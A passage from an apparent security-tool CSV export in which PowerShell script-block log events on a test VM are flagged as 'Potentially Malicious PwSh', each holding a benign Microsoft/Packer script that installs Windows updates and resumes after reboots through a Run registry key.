$script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:10:46.488 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,29,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: A:\win-updates.ps1 ¦ ScriptBlockId: 611ce1c2-9e82-473a-97ab-5e7083f361cc ¦ ScriptBlockText: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite $script:SearchResult.Updates.Item($i).Title LogWrite $script:SearchResult.Updates.Item($i).Description LogWrite $script:SearchResult.Updates.Item($i).RebootRequired LogWrite $script:SearchResult.Updates.Item($i).EulaAccepted } $global:MoreUpdates=1 } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Showing SearchResult was unsuccessful. Rebooting."" $global:RestartRequired=1 $global:MoreUpdates=0 Check-ContinueRestartOrEnd LogWrite ""Show never happen to see this text!"" Restart-Computer } } else { LogWrite 'There are no applicable updates' $global:RestartRequired=0 $global:MoreUpdates=0 } } $script:ScriptName = $MyInvocation.MyCommand.ToString() $script:ScriptPath = $MyInvocation.MyCommand.Path $script:UpdateSession = New-Object -ComObject 'Microsoft.Update.Session' $script:UpdateSession.ClientApplicationID = 'Packer Windows Update Installer' $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:SearchResult = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:Cycles = 0 $script:CycleUpdateCount = 0 Check-WindowsUpdates if ($global:MoreUpdates -eq 1) { Install-WindowsUpdates } else { Check-ContinueRestartOrEnd }","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:11:38.776 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,33,"ScriptBlock: # -------------------------------------------------------------- # # dev.microsoftedge.com -VMs # Copyright(c) Microsoft Corporation. All rights reserved. # # MIT License # # Permission is hereby granted, free of charge, to any person obtaining # a copy of this software and associated documentation files(the """"Software""""), # to deal in the Software without restriction, including without limitation the rights # to use, copy, modify, merge, publish, distribute, sublicense, and / or sell copies # of the Software, and to permit persons to whom the Software is furnished to do so, # subject to the following conditions : # # The above copyright notice and this permission notice shall be included # in all copies or substantial portions of the Software. # # THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, # INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS # FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE AUTHORS # OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF # OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. # # -------------------------------------------------------------- param($global:RestartRequired=0, $global:MoreUpdates=0, $global:MaxCycles=5, $MaxUpdatesPerCycle=500) $Logfile = ""C:\Windows\Temp\win-updates.log"" function LogWrite { Param ([string]$logstring) $now = Get-Date -format s Add-Content $Logfile -value ""$now $logstring"" Write-Host $logstring } function Check-ContinueRestartOrEnd() { $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" switch ($global:RestartRequired) { 0 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } LogWrite ""No Restart Required"" Check-WindowsUpdates if (($global:MoreUpdates -eq 1) -and ($script:Cycles -le $global:MaxCycles)) { Install-WindowsUpdates } elseif ($script:Cycles -gt $global:MaxCycles) { LogWrite ""Exceeded Cycle Count - Stopping"" Invoke-Expression ""a:\post-win-updates.ps1"" } else { LogWrite ""Done Installing Windows Updates"" Invoke-Expression ""a:\post-win-updates.ps1"" } } 1 { $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if (-not $prop) { LogWrite ""Restart Registry Entry Does Not Exist - Creating It"" Set-ItemProperty -Path $RegistryKey -Name $RegistryEntry -Value ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File $($script:ScriptPath) -MaxUpdatesPerCycle $($MaxUpdatesPerCycle)"" } else { LogWrite ""Restart Registry Entry Exists Already"" } LogWrite ""Restart Required - Restarting..."" Restart-Computer } default { LogWrite ""Unsure If A Restart Is Required"" break } } } function Install-WindowsUpdates() { $script:Cycles++ LogWrite ""Evaluating Available Updates with limit of $($MaxUpdatesPerCycle):"" $UpdatesToDownload = New-Object -ComObject 'Microsoft.Update.UpdateColl' $script:i = 0; $CurrentUpdates = $SearchResult.Updates while($script:i -lt $CurrentUpdates.Count -and $script:CycleUpdateCount -lt $MaxUpdatesPerCycle) { $Update = $CurrentUpdates.Item($script:i) if (($Update -ne $null) -and (!$Update.IsDownloaded)) { [bool]$addThisUpdate = $false if ($Update.InstallationBehavior.CanRequestUserInput) { LogWrite ""> Skipping: $($Update.Title) because it requires user input"" } else { if (!($Update.EulaAccepted)) { LogWrite ""> Note: $($Update.Title) has a license agreement that must be accepted. Accepting the license."" $Update.AcceptEula() [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } else { [bool]$addThisUpdate = $true $script:CycleUpdateCount++ } } if ([bool]$addThisUpdate) { LogWrite ""Adding: $($Update.Title)"" $UpdatesToDownload.Add($Update) |Out-Null } } $script:i++ } if ($UpdatesToDownload.Count -eq 0) { LogWrite ""No Updates To Download..."" } else { LogWrite 'Downloading Updates...' $ok = 0; while (! $ok) { try { $Downloader = $UpdateSession.CreateUpdateDownloader() $Downloader.Updates = $UpdatesToDownload $Downloader.Download() $ok = 1; } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Error downloading updates. Retrying in 30s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 30 } } } $UpdatesToInstall = New-Object -ComObject 'Microsoft.Update.UpdateColl' [bool]$rebootMayBeRequired = $false LogWrite 'The following updates are downloaded and ready to be installed:' foreach ($Update in $SearchResult.Updates) { if (($Update.IsDownloaded)) { LogWrite ""> $($Update.Title)"" $UpdatesToInstall.Add($Update) |Out-Null if ($Update.InstallationBehavior.RebootBehavior -gt 0){ [bool]$rebootMayBeRequired = $true } } } if ($UpdatesToInstall.Count -eq 0) { LogWrite 'No updates available to install...' $global:MoreUpdates=0 $global:RestartRequired=0 $RegistryKey = ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" $RegistryEntry = ""InstallWindowsUpdates"" $prop = (Get-ItemProperty $RegistryKey).$RegistryEntry if ($prop) { LogWrite ""Restart Registry Entry Exists - Removing It"" Remove-ItemProperty -Path $RegistryKey -Name $RegistryEntry -ErrorAction SilentlyContinue } Invoke-Expression ""a:\post-win-updates.ps1"" break } if ($rebootMayBeRequired) { LogWrite 'These updates may require a reboot' $global:RestartRequired=1 } LogWrite 'Installing updates...' $Installer = $script:UpdateSession.CreateUpdateInstaller() $Installer.Updates = $UpdatesToInstall $InstallationResult = $Installer.Install() LogWrite ""Installation Result: $($InstallationResult.ResultCode)"" LogWrite ""Reboot Required: $($InstallationResult.RebootRequired)"" LogWrite 'Listing of updates installed and individual installation results:' if ($InstallationResult.RebootRequired) { $global:RestartRequired=1 } else { $global:RestartRequired=0 } for($i=0; $i -lt $UpdatesToInstall.Count; $i++) { New-Object -TypeName PSObject -Property @{ Title = $UpdatesToInstall.Item($i).Title Result = $InstallationResult.GetUpdateResult($i).ResultCode } LogWrite ""Item: ""+ $UpdatesToInstall.Item($i).Title LogWrite ""Result: "" + $InstallationResult.GetUpdateResult($i).ResultCode } Check-ContinueRestartOrEnd } function Check-WindowsUpdates() { LogWrite ""Checking For Windows Updates"" $Username = $env:USERDOMAIN + ""\"" + $env:USERNAME New-EventLog -Source $ScriptName -LogName 'Windows Powershell' -ErrorAction SilentlyContinue $Message = ""Script: "" + $ScriptPath + ""`nScript User: "" + $Username + ""`nStarted: "" + (Get-Date).toString() Write-EventLog -LogName 'Windows Powershell' -Source $ScriptName -EventID ""104"" -EntryType ""Information"" -Message $Message LogWrite $Message $script:UpdateSearcher = $script:UpdateSession.CreateUpdateSearcher() $script:successful = $FALSE $script:attempts = 0 $script:maxAttempts = 12 while(-not $script:successful -and $script:attempts -lt $script:maxAttempts) { try { $script:SearchResult = $script:UpdateSearcher.Search(""IsInstalled=0 and Type='Software' and IsHidden=0"") $script:successful = $TRUE } catch { LogWrite $_.Exception | Format-List -force LogWrite ""Search call to UpdateSearcher was unsuccessful. Retrying in 10s."" $script:attempts = $script:attempts + 1 Start-Sleep -s 10 } } if ($SearchResult.Updates.Count -ne 0) { $Message = ""There are "" + $SearchResult.Updates.Count + "" more updates."" LogWrite $Message try { for($i=0; $i -lt $script:SearchResult.Updates.Count; $i++) { LogWrite 